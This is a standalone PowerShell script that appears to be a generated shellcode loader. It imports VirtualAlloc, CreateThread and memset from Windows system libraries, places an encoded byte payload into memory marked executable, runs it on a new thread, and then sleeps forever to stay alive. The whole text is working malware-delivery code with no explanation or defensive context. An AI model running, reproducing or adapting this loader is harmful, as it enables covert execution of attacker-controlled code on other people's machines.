
$pccp = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $pccp -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x67,0x8e,0x70,0x9d,0xdb,0xc5,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x75,0x13,0x83,0xed,0xfc,0x03,0x75,0x68,0x6c,0x85,0x61,0x9e,0xf2,0x66,0x9a,0x5e,0x93,0xef,0x7f,0x6f,0x93,0x94,0xf4,0xdf,0x23,0xde,0x59,0xd3,0xc8,0xb2,0x49,0x60,0xbc,0x1a,0x7d,0xc1,0x0b,0x7d,0xb0,0xd2,0x20,0xbd,0xd3,0x50,0x3b,0x92,0x33,0x69,0xf4,0xe7,0x32,0xae,0xe9,0x0a,0x66,0x67,0x65,0xb8,0x97,0x0c,0x33,0x01,0x13,0x5e,0xd5,0x01,0xc0,0x16,0xd4,0x20,0x57,0x2d,0x8f,0xe2,0x59,0xe2,0xbb,0xaa,0x41,0xe7,0x86,0x65,0xf9,0xd3,0x7d,0x74,0x2b,0x2a,0x7d,0xdb,0x12,0x83,0x8c,0x25,0x52,0x23,0x6f,0x50,0xaa,0x50,0x12,0x63,0x69,0x2b,0xc8,0xe6,0x6a,0x8b,0x9b,0x51,0x57,0x2a,0x4f,0x07,0x1c,0x20,0x24,0x43,0x7a,0x24,0xbb,0x80,0xf0,0x50,0x30,0x27,0xd7,0xd1,0x02,0x0c,0xf3,0xba,0xd1,0x2d,0xa2,0x66,0xb7,0x52,0xb4,0xc9,0x68,0xf7,0xbe,0xe7,0x7d,0x8a,0x9c,0x6f,0xb1,0xa7,0x1e,0x6f,0xdd,0xb0,0x6d,0x5d,0x42,0x6b,0xfa,0xed,0x0b,0xb5,0xfd,0x12,0x26,0x01,0x91,0xed,0xc9,0x72,0xbb,0x29,0x9d,0x22,0xd3,0x98,0x9e,0xa8,0x23,0x25,0x4b,0x44,0x21,0xb1,0x26,0xa4,0x20,0x9e,0xaf,0xd4,0x32,0x21,0x8b,0x50,0xd4,0x71,0xbb,0x32,0x49,0x31,0x6b,0xf3,0x39,0xd9,0x61,0xfc,0x66,0xf9,0x89,0xd6,0x0e,0x93,0x65,0x8f,0x67,0x0b,0x1f,0x8a,0xfc,0xaa,0xe0,0x00,0x79,0xec,0x6b,0xa7,0x7d,0xa2,0x9b,0xc2,0x6d,0x52,0x6c,0x99,0xcc,0xf4,0x73,0x37,0x7a,0xf8,0xe1,0xbc,0x2d,0xaf,0x9d,0xbe,0x08,0x87,0x01,0x40,0x7f,0x9c,0x88,0xd4,0xc0,0xca,0xf4,0x38,0xc1,0x0a,0xa3,0x52,0xc1,0x62,0x13,0x07,0x92,0x97,0x5c,0x92,0x86,0x04,0xc9,0x1d,0xff,0xf9,0x5a,0x76,0xfd,0x24,0xac,0xd9,0xfe,0x03,0x2c,0x25,0x29,0x6d,0x5a,0x47,0xe9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$841D=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($841D.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$841D,0,0,0);for (;;){Start-sleep 60};

